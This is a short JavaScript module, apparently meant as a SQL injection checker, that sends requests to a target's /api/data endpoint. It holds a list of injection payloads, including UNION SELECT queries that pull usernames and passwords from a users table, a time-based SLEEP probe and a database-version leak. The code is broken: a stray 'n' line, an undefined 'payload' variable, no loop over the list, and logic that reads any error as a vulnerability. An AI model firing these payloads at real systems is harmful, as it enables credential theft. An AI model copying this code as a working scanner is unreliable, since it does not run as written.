const axios = require('axios');

async function sqlInjectionChecker(url) {
  console.log('Checking for SQL Injection...');
n

  try {
    const payloads = [
  `1' OR '1'='1`,
  `' UNION SELECT username, password FROM users --`,
  `' OR IF(1=1, SLEEP(5), 0) --`,
  `' OR 1=CONVERT(int, (SELECT @@version)) --`,
  `' OR 'x'='x`,
  `' UNION SELECT null, username, password FROM users ORDER BY 2 --`,
];

    const response = await axios.get(`${url}/api/data?param=${payload}`);
    const responseData = response.data;


    console.log('SQL Injection Check Result:', 'No vulnerabilities found');
  } catch (error) {
    console.error('SQL Injection Check Result:', 'Potential SQL Injection Vulnerability');
  }
}

module.exports = sqlInjectionChecker;
